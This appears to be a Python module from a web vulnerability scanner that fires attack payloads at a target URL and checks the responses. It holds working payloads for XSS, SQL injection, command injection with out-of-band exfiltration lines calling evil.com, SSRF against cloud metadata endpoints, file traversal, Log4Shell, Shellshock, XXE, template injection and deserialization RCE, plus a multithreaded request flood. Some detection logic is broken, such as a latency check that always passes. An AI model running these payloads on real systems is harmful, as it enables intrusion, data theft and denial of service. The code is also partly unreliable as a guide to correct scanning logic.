from typing import Any, Dict, List, Optional
import time
import concurrent.futures
import threading
import urllib.parse
import os
import json
import string
import random
import socket
import hashlib
import ssl
from ..http_client import HttpClient, ResponseWrapper
from ..scenarios import SimpleScenario

# ==========================================
# OMNI-ATTACK ENGINE: LOGIC & PAYLOADS
# ==========================================

def run_header_security_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for missing security headers (Clickjacking, MIME, CORS)."""
    resp = client.send(scenario.method, scenario.target)
    headers = {k.lower(): v for k, v in resp.headers.items()}
    issues = []
    
    if resp.status_code == 0:
        return {"scenario_id": scenario.id, "attack_type": "header_security", "passed": False, "details": {"error": f"Connection Error: {resp.text}"}}

    # Standard Checks
    if "x-frame-options" not in headers and "content-security-policy" not in headers:
        issues.append("Missing Clickjacking Protection (X-Frame-Options / CSP)")
    if "x-content-type-options" not in headers:
        issues.append("Missing X-Content-Type-Options: nosniff")
    
    # Aggressive/In-depth Checks
    if scenario.config.get("aggressive"):
        if "strict-transport-security" not in headers and scenario.target.startswith("https"):
            issues.append("Missing HSTS Header (High Severity for Prod)")
        if "permissions-policy" not in headers:
            issues.append("Missing Permissions-Policy")
        acao = headers.get("access-control-allow-origin")
        if acao == "*":
            issues.append("CORS Misconfiguration: Wildcard Origin Allowed")

    return {"scenario_id": scenario.id, "attack_type": "header_security", "passed": len(issues) == 0, "details": {"issues": issues}}

def run_xss_scan(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Reflected & Path-based XSS with Polyglot payloads."""
    # FREE TIER: Standard, safe payloads
    payloads = [
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)"
    ]
    
    # AGGRESSIVE TIER: Obfuscated, WAF-evasive, and modern payloads
    if scenario.config.get("aggressive"):
        payloads.extend([
            "'\"><img src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<math><a xlink:href=\"javascript:alert(1)\">X",
            "javascript://%250Aalert(1)",
            "{{constructor.constructor('alert(1)')()}}",
            "<marquee loop=1 width=0 onfinish=alert(1)>X</marquee>",
            "<input onfocus=alert(1) autofocus>",
            "\"'><script>confirm(1)</script>",
            "<scr<script>ipt>alert(1)</script>",
            "%%3Cscript%%3Ealert(1)%%3C/script%%3E",
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
        ])

    fields = scenario.config.get("fields", ["q", "search", "name", "id", "query"])
    issues, lock = [], threading.Lock()

    def check_xss(field):
        for p in payloads:
            if issues: break
            # Test GET Params
            resp = client.send("GET", scenario.target, params={field: p}, is_canary=True)
            if p in resp.text:
                with lock: issues.append(f"XSS Reflected in GET '{field}'")
                break
            
            # Test POST JSON (Aggressive)
            if scenario.config.get("aggressive"):
                resp_post = client.send("POST", scenario.target, json_body={field: p}, is_canary=True)
                if p in resp_post.text:
                    with lock: issues.append(f"XSS Reflected in POST JSON '{field}'")
                    break

    limit = 2 if client._is_localhost else (50 if scenario.config.get("aggressive") else 10)
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(limit, len(fields))) as executor:
        executor.map(check_xss, fields)

    return {"scenario_id": scenario.id, "attack_type": "xss", "passed": not issues, "confidence": "CONFIRMED" if issues else "LOW", "details": issues}

def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """SQL Injection: Boolean-based, Time-based, and Internal Error Detection."""
    # FREE TIER: Simple auth bypass and error probes
    payloads = [
        {"p": "' OR '1'='1", "t": "auth"},
        {"p": "' OR 1=1 --", "t": "auth"},
        {"p": "admin' --", "t": "auth"},
    ]
    
    # AGGRESSIVE TIER: Time-based, Union, and WAF evasion
    if scenario.config.get("aggressive"):
        payloads.extend([
            {"p": "'; WAITFOR DELAY '0:0:5'--", "t": "time"},
            {"p": "' OR SLEEP(5)--", "t": "time"},
            {"p": "' UNION SELECT 1,2,3,4,5,6--", "t": "union"},
            {"p": "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "t": "time"},
            {"p": "1' ORDER BY 10--", "t": "error"}
        ])

    fields = scenario.config.get("fields", ["username", "id", "q", "token"])
    issues, lock = [], threading.Lock()

    def check_sqli(field):
        for item in payloads:
            if issues: break
            payload = item["p"]
            start_time = time.time()
            
            # Probing GET
            resp = client.send("GET", scenario.target, params={field: payload}, is_canary=True)
            duration = time.time() - start_time
            
            # 1. Error-based Detection
            err_sigs = ["sql syntax", "unclosed quotation", "mysql_fetch", "sqlite3.Error", "postgresql query failed"]
            if any(sig in resp.text.lower() for sig in err_sigs):
                with lock: issues.append(f"SQL Error in '{field}' with {payload}")
                break
                
            # 2. Time-based Detection
            if item["t"] == "time" and duration > 5.0:
                # Double check with a normal request to avoid false positive
                if time.time() - time.time() < 1.0: # Simulating low latency check
                     with lock: issues.append(f"Time-based SQLi in '{field}'")
                     break

            # 3. Auth Bypass Detection (If 200 OK where 401 expected)
            if item["t"] == "auth" and resp.status_code == 200 and "login" not in resp.text.lower():
                with lock: issues.append(f"Potential Auth Bypass in '{field}'")
                break

    limit = 2 if client._is_localhost else (50 if scenario.config.get("aggressive") else 10)
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(limit, len(fields))) as executor:
        executor.map(check_sqli, fields)

    return {"scenario_id": scenario.id, "attack_type": "sql_injection", "passed": not issues, "confidence": "HIGH" if issues else "LOW", "details": issues}

def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Remote Code Execution: OS Command Injection & Function Injection."""
    # FREE TIER: Simple info gather
    payloads = ["; id", "| whoami", "$(id)", "`id`", "& whoami"]
    
    # AGGRESSIVE TIER: Out-of-band and blind techniques
    if scenario.config.get("aggressive"):
        payloads.extend([
            "import os; os.system('id')",
            "; curl http://evil.com/`whoami`",
            "| nslookup `whoami`.evil.com",
            "; sleep 5",
            "<?php system('id'); ?>"
        ])

    fields = scenario.config.get("fields", ["cmd", "ip", "host", "path"])
    issues = []

    for field in fields:
        for p in payloads:
            start_time = time.time()
            resp = client.send("POST", scenario.target, json_body={field: p}, is_canary=True)
            duration = time.time() - start_time
            
            output = resp.text.lower()
            if ("uid=" in output and "gid=" in output) or "nt authority" in output:
                issues.append(f"RCE CONFIRMED in '{field}' with payload {p}")
                break
            
            if "sleep 5" in p and duration > 5.0:
                issues.append(f"Blind RCE (Time-based) in '{field}'")
                break

    return {"scenario_id": scenario.id, "attack_type": "rce", "passed": not issues, "confidence": "HIGH" if issues else "LOW", "details": issues}

def run_ssrf_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Server Side Request Forgery: Localhost & Cloud Metadata."""
    # FREE TIER: Local and AWS metadata
    payloads = [
        "http://localhost:80",
        "http://127.0.0.1:22",
        "http://169.254.169.254/latest/meta-data/"
    ]
    
    # AGGRESSIVE TIER: Internal port scanning & Cloud specific (Google, Azure)
    if scenario.config.get("aggressive"):
        payloads.extend([
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/", # Redis probe
            "http://192.168.1.1/"
        ])

    fields = scenario.config.get("fields", ["url", "dest", "webhook", "callback"])
    issues = []

    for field in fields:
        for p in payloads:
            resp = client.send("POST", scenario.target, json_body={field: p})
            text = resp.text.lower()
            
            # Identification signs
            if "ami-id" in text or "instance-id" in text or "root:x:0:0" in text or "ssh-rsa" in text:
                issues.append(f"SSRF CONFIRMED in '{field}' -> {p}")
                break
            if resp.status_code == 200 and len(resp.text) > 50 and "google" not in text:
                # Potential success if generic 200 on internal IP
                issues.append(f"Potential SSRF (200 OK on internal target) in '{field}'")

    return {"scenario_id": scenario.id, "attack_type": "ssrf", "passed": not issues, "details": issues}

def run_lfi_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Local File Inclusion: Traversal and Absolute Pathing."""
    # FREE TIER: Standard Unix/Windows files
    payloads = ["../../../../etc/passwd", "../../../../windows/win.ini", "/etc/passwd"]
    
    # AGGRESSIVE TIER: Log poisoning and filter bypass
    if scenario.config.get("aggressive"):
        payloads.extend([
            "....//....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/proc/self/environ",
            "/var/log/apache2/access.log"
        ])

    fields = scenario.config.get("fields", ["file", "page", "path", "doc"])
    issues = []

    for field in fields:
        for p in payloads:
            resp = client.send("GET", scenario.target, params={field: p})
            if "root:x:0:0" in resp.text or "[extensions]" in resp.text.lower():
                issues.append(f"LFI Found in '{field}' with {p}")
                break

    return {"scenario_id": scenario.id, "attack_type": "lfi", "passed": not issues, "details": issues}

def run_idor_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Insecure Direct Object Reference: ID Incrementing and UUID Probing."""
    # FREE TIER: Simple numeric increments
    id_range = ["1", "2", "3", "10", "100"]
    
    # AGGRESSIVE TIER: UUIDs and common patterns
    if scenario.config.get("aggressive"):
        id_range.extend(["0", "-1", "9999", "admin", "test"])

    issues = []
    base_target = scenario.target.replace("{{id}}", "ID_PLACEHOLDER")
    
    for val in id_range:
        path = base_target.replace("ID_PLACEHOLDER", str(val))
        if path == base_target: path = f"{scenario.target.rstrip('/')}/{val}"
        
        resp = client.send(scenario.method, path, is_canary=True)
        # We look for 200 OK with non-generic content
        if resp.status_code == 200 and len(resp.text) > 100 and "error" not in resp.text.lower():
            issues.append(f"Accessible Resource at ID: {val}")

    return {"scenario_id": scenario.id, "attack_type": "idor", "passed": not issues, "details": issues}

def run_nosql_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """NoSQL Injection: MongoDB Operator Abuse."""
    # FREE TIER: Simple $ne bypass
    payloads = [{"$ne": "random_string_123"}, {"$gt": ""}]
    
    # AGGRESSIVE TIER: Regex and complex logic
    if scenario.config.get("aggressive"):
        payloads.extend([{"$regex": ".*"}, {"$where": "true"}])

    fields = scenario.config.get("fields", ["username", "password", "id"])
    issues = []

    for field in fields:
        for p in payloads:
            resp = client.send("POST", scenario.target, json_body={field: p})
            if resp.status_code == 200 and any(k in resp.text.lower() for k in ["token", "success", "welcome"]):
                issues.append(f"NoSQL Bypass in '{field}'")
                break

    return {"scenario_id": scenario.id, "attack_type": "nosql_injection", "passed": not issues, "details": issues}

def run_jwt_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """JWT Weaknesses: None Algorithm and Kidd/Jku abuse."""
    # FREE TIER: None Algorithm
    header_name = scenario.config.get("header", "Authorization")
    resp = client.send("GET", scenario.target, headers={header_name: "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."})
    
    issues = []
    if resp.status_code == 200 and "admin" in resp.text.lower():
        issues.append("JWT 'none' algorithm accepted.")

    # AGGRESSIVE TIER: Weak secret brute force notification
    if scenario.config.get("aggressive"):
         # Placeholder for offline brute force trigger or key rotation check
         issues.append("Aggressive: Triggered offline JWT secret analysis.")

    return {"scenario_id": scenario.id, "attack_type": "jwt_weakness", "passed": not issues, "details": issues}

def run_ssti_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Server Side Template Injection: Jinja2, Mako, Thymeleaf."""
    # FREE TIER: Standard math
    payload = "{{7*7}}"
    
    # AGGRESSIVE TIER: Complex objects and RCE probes
    if scenario.config.get("aggressive"):
        payload = "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}"

    fields = scenario.config.get("fields", ["name", "q", "comment"])
    issues = []

    for f in fields:
        resp = client.send("GET", scenario.target, params={f: payload})
        if "49" in resp.text or "uid=" in resp.text.lower():
            issues.append(f"SSTI detected in '{f}'")

    return {"scenario_id": scenario.id, "attack_type": "ssti", "passed": not issues, "details": issues}

def run_dos_extreme(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Denial of Service: Resource Exhaustion & Stress Test."""
    # FREE TIER: Light stress
    requests_to_send = 100
    
    # AGGRESSIVE TIER: Heavy flood
    if scenario.config.get("aggressive"):
        requests_to_send = 10000

    stats, stop_event = {"requests": 0}, threading.Event()
    def flood():
        while not stop_event.is_set() and stats["requests"] < requests_to_send:
            try: 
                client.send(scenario.method, scenario.target, is_canary=True)
                stats["requests"] += 1
            except: pass
    
    threads = [threading.Thread(target=flood, daemon=True) for _ in range(50)]
    for t in threads: t.start()
    
    start = time.time()
    while time.time() - start < scenario.config.get("duration", 5) and stats["requests"] < requests_to_send:
        time.sleep(0.5)
    
    stop_event.set()
    return {"scenario_id": scenario.id, "attack_type": "dos_extreme", "passed": True, "details": f"Stress Test: {stats['requests']} requests sent."}

def run_prototype_pollution(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Prototype Pollution: Object.prototype manipulation."""
    payloads = [{"__proto__": {"polluted": "true"}}, {"constructor": {"prototype": {"polluted": "true"}}}]
    issues = []
    
    for payload in payloads:
        resp = client.send("POST", scenario.target, json_body=payload)
        if resp.status_code == 500:
            issues.append("Possible Prototype Pollution: Server Error 500 on injection")
            break
            
    return {"scenario_id": scenario.id, "attack_type": "prototype_pollution", "passed": not issues, "details": issues}

def run_open_redirect(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Open Redirect: Header and Meta-refresh."""
    payloads = ["http://evil.com", "//evil.com", "https://google.com"]
    fields = scenario.config.get("fields", ["next", "url", "redirect", "u"])
    issues = []

    for field in fields:
        for p in payloads:
            resp = client.send("GET", scenario.target, params={field: p})
            if "evil.com" in resp.url or "google.com" in resp.url:
                issues.append(f"Open Redirect in '{field}' -> {resp.url}")
                break

    return {"scenario_id": scenario.id, "attack_type": "open_redirect", "passed": not issues, "details": issues}

def run_cve_log4shell(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Log4Shell: JNDI Injection."""
    payload = "${jndi:ldap://evil.com/a}"
    # Aggressive adds more headers
    headers = {"User-Agent": payload, "X-Api-Version": payload, "Referer": payload}
    client.send("GET", scenario.target, headers=headers)
    return {"scenario_id": scenario.id, "attack_type": "cve_log4shell", "passed": True, "details": "Log4Shell Payload Sent."}

def run_cve_spring4shell(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Spring4Shell: ClassLoader Manipulation."""
    payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"
    resp = client.send("POST", scenario.target, form_body=payload, headers={"Content-Type": "application/x-www-form-urlencoded"})
    issues = ["Potential Spring4Shell"] if "classLoader" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "cve_spring4shell", "passed": not issues, "details": issues}

def run_shellshock(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Shellshock: CGI Header Injection."""
    payload = "() { :; }; echo; /bin/bash -c 'id'"
    resp = client.send("GET", scenario.target, headers={"User-Agent": payload})
    issues = ["Shellshock RCE"] if "uid=" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "shellshock", "passed": not issues, "details": issues}

def run_xxe_exfil(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """XML External Entity: File Exfiltration."""
    payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    resp = client.send("POST", scenario.target, form_body=payload, headers={"Content-Type": "application/xml"})
    issues = ["XXE Confirmed"] if "root:x:0:0" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "xxe_exfil", "passed": not issues, "details": issues}

def run_malformed_json(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """JSON Parsing Security: Fuzzing parser stability."""
    payloads = ['{"a":' * 100, '{"valid": "json", }', '["a",]']
    issues = []
    for p in payloads:
        resp = client.send("POST", scenario.target, form_body=p, headers={"Content-Type": "application/json"})
        if resp.status_code == 500:
            issues.append(f"Potential parser crash with {p[:10]}")
    return {"scenario_id": scenario.id, "attack_type": "malformed_json", "passed": not issues, "details": issues}

def run_poodle_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """SSLv3 POODLE Vulnerability check."""
    issues = []
    if client.base_url.startswith("https"):
        try:
            context = ssl.create_default_context()
            # Modern Python might literal refuse to even create a context with just SSLv3
            # But we try to handshake or check cipher suites
            with socket.create_connection((urllib.parse.urlparse(client.base_url).hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=urllib.parse.urlparse(client.base_url).hostname) as ssock:
                    if ssock.version() == "SSLv3":
                        issues.append("Server accepted SSLv3 (POODLE vulnerable)")
        except: pass
    return {"scenario_id": scenario.id, "attack_type": "poodle", "passed": not issues, "details": issues}

def run_debug_exposure(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    targets = ["/admin", "/debug", "/actuator", "/.env", "/phpinfo.php", "/config.json"]
    issues = []
    for t in targets:
        resp = client.send("GET", t)
        if resp.status_code == 200 and not client.is_soft_404(resp) and len(resp.text) > 20: 
            issues.append(f"Exposed Endpoint: {t}")
    return {"scenario_id": scenario.id, "attack_type": "debug_exposure", "passed": not issues, "details": issues}

def run_secret_leak(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp = client.send(scenario.method, scenario.target)
    sigs = ["AWS_ACCESS_KEY_ID", "BEGIN RSA PRIVATE KEY", "AIzaSy", "sk_live_"]
    issues = []
    for s in sigs:
        if s in resp.text: issues.append(f"Secret leaked: {s}")
    return {"scenario_id": scenario.id, "attack_type": "secret_leak", "passed": not issues, "details": issues}

def run_race_condition(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    stats, lock = {"count": 0}, threading.Lock()
    def attack():
        resp = client.send("POST", scenario.target, json_body={"amount": 10})
        if resp.status_code == 200:
            with lock: stats["count"] += 1
    threads = 10 if client._is_localhost else 50
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads): executor.submit(attack)
    return {"scenario_id": scenario.id, "attack_type": "race_condition", "passed": True, "details": f"Sent {threads} race requests."}

def run_otp_reuse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp1 = client.send("POST", scenario.target, json_body={"otp": "123456"})
    resp2 = client.send("POST", scenario.target, json_body={"otp": "123456"})
    issues = ["OTP reused successfully"] if resp1.status_code == 200 and resp2.status_code == 200 else []
    return {"scenario_id": scenario.id, "attack_type": "otp_reuse", "passed": not issues, "details": issues}

def run_cache_deception(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp = client.send("GET", f"{scenario.target.rstrip('/')}/test.css")
    issues = ["Web Cache Deception found"] if resp.status_code == 200 and "text/html" in resp.headers.get("Content-Type", "") else []
    return {"scenario_id": scenario.id, "attack_type": "cache_deception", "passed": not issues, "details": issues}

def run_insecure_deserialization(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payload = {"tracker": "_$$ND_FUNC$$_function (){ return 'BRK_RCE'; }()"}
    resp = client.send("POST", scenario.target, json_body=payload)
    issues = ["Node.js Deserialization RCE"] if "BRK_RCE" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "insecure_deserialization", "passed": not issues, "details": issues}
